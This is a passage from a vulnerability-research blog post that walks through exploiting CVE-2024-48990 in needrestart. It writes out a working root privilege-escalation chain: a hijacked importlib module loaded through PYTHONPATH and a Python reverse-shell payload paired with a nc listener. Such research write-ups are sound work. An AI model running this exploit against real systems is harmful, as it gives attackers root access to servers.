</span></span></code></pre></div><p>This verifies that we will be able to invoke <code>needrestart_interp_check()</code> with the PID of our malicious process since all of the processes are iterated through.</p><h1 id=exploit-development>Exploit Development<a hidden class=anchor aria-hidden=true href=#exploit-development>#</a></h1><h2 id=flushing-out-the-plan>Flushing out the Plan<a hidden class=anchor aria-hidden=true href=#flushing-out-the-plan>#</a></h2><p>Since I couldn&rsquo;t do library path hijacking with the built-in <code>sys</code> module, I thought about other options that I could target within the short Python snippet <code>import sys\nprint(sys.path)</code> that is executed in <code>Python.pm</code>.</p><p>There are two other notable tokens aside from <code>sys</code>: <code>print</code> and <code>import</code>. I decided to read more about how <code>import</code> in the official <a href=https://docs.python.org/3/reference/simple_stmts.html#import>documentation</a>. In particular, this snippet from the docs stood out to me:</p><blockquote><p>importlib.import_module() is provided to support applications that determine dynamically the modules to be loaded.</p></blockquote><p>It seems that using the <code>import</code> statement in python can trigger the <code>importlib</code> module. I used the <code>find</code> command to verify that <code>importlib</code> is indeed a dynamically loaded library rather than a Python built-in like <code>sys</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ find / -name importlib 2&gt;/dev/null
</span></span><span style=display:flex><span>/usr/lib/python3.12/importlib
</span></span></code></pre></div><p>Maybe we can take advantage of <code>importlib</code> being dynamically loaded along with the fact that the contents of <code>__init__.py</code> are automatically executed when a module is loaded. I created a directory in <code>/tmp/needrestart</code> with the following structure:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>./importlib
</span></span><span style=display:flex><span>./importlib/__init__.py
</span></span><span style=display:flex><span>./main.py
</span></span></code></pre></div><p>The contents of <code>main.py</code> are below.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ main.py
</span></span><span style=display:flex><span>import sys
</span></span></code></pre></div><p>In <code>./importlib/__init__.py</code>, I write Python code that will create a <code>hacked.txt</code> file:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ cat ./importlib/__init__.py
</span></span><span style=display:flex><span>import os
</span></span><span style=display:flex><span>os.system<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;touch hacked.txt&#34;</span><span style=color:#f92672>)</span>
</span></span></code></pre></div><p>Let&rsquo;s put this idea to the test! I will <code>export PYTHONPATH=/tmp/needrestart</code> and manually replicate the <code>python</code> process that <code>needrestart</code> executes.</p><p><img loading=lazy src=/images/needrestart-testing-importlib.png alt="The <code>hacked.txt</code> file being created after importing <code>sys</code> with the modified <code>PYTHONPATH</code> value pointing to <code>/tmp/needrestart</code>"></p><p>It works! Let&rsquo;s see if we can port this attack directly to <code>needrestart</code>.</p><h2 id=launching-the-exploit>Launching the exploit<a hidden class=anchor aria-hidden=true href=#launching-the-exploit>#</a></h2><p>I modified <code>main.py</code> to be an infinite loop so that it continues running while <code>needrestart</code> is searching the process list. The purpose of this file is to simply trigger the Python interpreter scan with our desired <code>PYTHONPATH</code> value.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ cat main.py
</span></span><span style=display:flex><span><span style=color:#66d9ef>while</span> True:
</span></span><span style=display:flex><span>	pass
</span></span></code></pre></div><p>Let&rsquo;s up the ante here and get a reverse shell as root.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ cat importlib/__init__.py 
</span></span><span style=display:flex><span>import os,pty,socket;s<span style=color:#f92672>=</span>socket.socket<span style=color:#f92672>()</span>;s.connect<span style=color:#f92672>((</span><span style=color:#e6db74>&#34;127.0.0.1&#34;</span>,1337<span style=color:#f92672>))</span>;<span style=color:#f92672>[</span>os.dup2<span style=color:#f92672>(</span>s.fileno<span style=color:#f92672>()</span>,f<span style=color:#f92672>)</span><span style=color:#66d9ef>for</span> f in<span style=color:#f92672>(</span>0,1,2<span style=color:#f92672>)]</span>;pty.spawn<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;sh&#34;</span><span style=color:#f92672>)</span>
</span></span></code></pre></div><p>I executed <code>python3 ./main.py</code> with our malicious <code>PYTHONPATH</code> variable.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ export PYTHONPATH<span style=color:#f92672>=</span>/tmp/needrestart
</span></span><span style=display:flex><span>$ python3 ./main.py
</span></span></code></pre></div><p>In a separate terminal, I verified that our process was showing up and the desired <code>PYTHONPATH</code> variable was set in the way that <code>needrestart</code> would read it.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ ps ax | grep python3
</span></span><span style=display:flex><span> <span style=color:#ae81ff>428477</span> pts/13   R+     0:03 python3 ./main.py
</span></span><span style=display:flex><span>$ cat /proc/428477/environ | grep --text -oP <span style=color:#e6db74>&#39;PYTHONPATH[^\x00]*&#39;</span> <span style=color:#75715e># verify our environment variable shows up</span>
</span></span><span style=display:flex><span>PYTHONPATH<span style=color:#f92672>=</span>/tmp/needrestart
</span></span></code></pre></div><p><em>Note: Make sure that the python3 binary that you are running is located at a path that follows this regex pattern for <code>needrestart</code> to recognize it as a valid Python program: <code>^/usr/(local/)?bin/python([23][.\d]*)?$</code>.</em></p><p>Now, I will test the exploit by setting up a <code>nc</code> listener and attempting to install <code>curl</code> using <code>apt</code>!</p><video width=100% controls>
<source src=/videos/CVE-2024-48990_poc.mp4 type=video/mp4></video><p>It worked! We have successfully identified and exploited the n-day, CVE-2024-48990. In a real-world environment, it is likely that a system administrator or cron job would periodically perform library upgrades on the vulnerable server through a package manager. The package manager, with elevated privileges, would launch <code>needrestart</code>, which ends up scanning our attacker-controlled process and ultimately executing our desired Python code as root.</p><p>Thanks for reading!</p></div><footer class=post-footer><ul class=post-tags><li><a href=https://ally-petitt.com:443/en/tags/vulnerability-research/>Vulnerability-Research</a></li><li><a href=https://ally-petitt.com:443/en/tags/cve/>CVE</a></li></ul><nav class=paginav><a class=next href=https://ally-petitt.com:443/en/posts/2024-07-05_emulating-with-nvram/><span class=title>Next »</span><br><span>How to Use NVRAM When Emulating an Embedded Device</span></a></nav><ul class=share-buttons><li><a target=_blank rel="noopener noreferrer" aria-label="share Rediscovering CVE-2024-48990 and Crafting My Own Exploit on x" href="https://x.com/intent/tweet/?text=Rediscovering%20CVE-2024-48990%20and%20Crafting%20My%20Own%20Exploit&amp;url=https%3a%2f%2fally-petitt.com%3a443%2fen%2fposts%2f2024-12-25_rediscovering-cve-2024-48990-and-crafting-my-own-exploit%2f&amp;hashtags=Vulnerability-Research%2cCVE"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446C483.971.0 512 28.03 512 62.554zM269.951 190.75 182.567 75.216H56L207.216 272.95 63.9 436.783h61.366L235.9 310.383l96.667 126.4H456L298.367 228.367l134-153.151H371.033zM127.633 110h36.468l219.38 290.065H349.5z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Rediscovering CVE-2024-48990 and Crafting My Own Exploit on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fally-petitt.com%3a443%2fen%2fposts%2f2024-12-25_rediscovering-cve-2024-48990-and-crafting-my-own-exploit%2f&amp;title=Rediscovering%20CVE-2024-48990%20and%20Crafting%20My%20Own%20Exploit&amp;summary=Rediscovering%20CVE-2024-48990%20and%20Crafting%20My%20Own%20Exploit&amp;source=https%3a%2f%2fally-petitt.com%3a443%2fen%2fposts%2f2024-12-25_rediscovering-cve-2024-48990-and-crafting-my-own-exploit%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Rediscovering CVE-2024-48990 and Crafting My Own Exploit on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fally-petitt.com%3a443%2fen%2fposts%2f2024-12-25_rediscovering-cve-2024-48990-and-crafting-my-own-exploit%2f&title=Rediscovering%20CVE-2024-48990%20and%20Crafting%20My%20Own%20Exploit"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Rediscovering CVE-2024-48990 and Crafting My Own Exploit on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fally-petitt.com%3a443%2fen%2fposts%2f2024-12-25_rediscovering-cve-2024-48990-and-crafting-my-own-exploit%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Rediscovering CVE-2024-48990 and Crafting My Own Exploit on whatsapp" href="https://api.whatsapp.com/send?text=Rediscovering%20CVE-2024-48990%20and%20Crafting%20My%20Own%20Exploit%20-%20https%3a%2f%2fally-petitt.com%3a443%2fen%2fposts%2f2024-12-25_rediscovering-cve-2024-48990-and-crafting-my-own-exploit%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Rediscovering CVE-2024-48990 and Crafting My Own Exploit on telegram" href="https://telegram.me/share/url?text=Rediscovering%20CVE-2024-48990%20and%20Crafting%20My%20Own%20Exploit&amp;url=https%3a%2f%2fally-petitt.com%3a443%2fen%2fposts%2f2024-12-25_rediscovering-cve-2024-48990-and-crafting-my-own-exploit%2f"><svg viewBox="2 2 28 28" height="30" width="30" fill="currentcolor"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Rediscovering CVE-2024-48990 and Crafting My Own Exploit on ycombinator" href="https://news.ycombinator.com/submitlink?t=Rediscovering%20CVE-2024-48990%20and%20Crafting%20My%20Own%20Exploit&u=https%3a%2f%2fally-petitt.com%3a443%2fen%2fposts%2f2024-12-25_rediscovering-cve-2024-48990-and-crafting-my-own-exploit%2f"><svg width="30" height="30" viewBox="0 0 512 512" fill="currentcolor" xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape"><path d="M449.446.0C483.971.0 512 28.03 512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446zM183.8767 87.9921h-62.034L230.6673 292.4508V424.0079h50.6655V292.4508L390.1575 87.9921H328.1233L256 238.2489z"/></svg></a></li></ul></footer></article></main><footer class=footer><span>&copy; 2024 <a href=https://ally-petitt.com:443/en/>Ally Petitt</a></span> ·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>